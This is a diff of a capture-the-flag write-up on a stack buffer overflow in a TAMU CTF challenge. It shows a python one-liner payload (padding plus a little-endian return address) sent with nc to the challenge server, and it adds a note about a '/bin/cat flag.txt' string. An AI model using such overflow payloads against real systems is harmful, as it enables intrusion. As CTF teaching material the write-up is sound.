@@ -57,7 +57,7 @@ We can redirect execution to `flag_func` by crafting the input as follows:
 
 * 12 bytes for filling the buffer
 * 4 bytes for overwriting the saved value of `ebp` on the stack
-* \xCB\x84\x04\x08 \(the address of `flag_func` in little endian byte order\)
+* `\xCB\x84\x04\x08` \(the address of `flag_func` in little endian byte order\)
 
 Testing with these values:
 
@@ -65,10 +65,22 @@ Testing with these values:
 $ python -c "print 'A'*16+ '\xCB\x84\x04\x08'" > exploit  
 $ nc web.ctf.tamu.edu 4324 < exploit 
 I require an input: 
-Did you really think it would be that easy? 
+Did you really think it would be that easy?
 ```
 
 We do not get the flag.
+
+Searching for strings we get one which is not used anywhere.
+
+```nasm
+.data:0804A028                 public flag
+.data:0804A028 flag            db '/bin/cat flag.txt',0
+.data:0804A028 _data           ends
+```
+
+This suggests the flag must be in the file flag.txt and not flag2.txt.
+
+
 
 
 
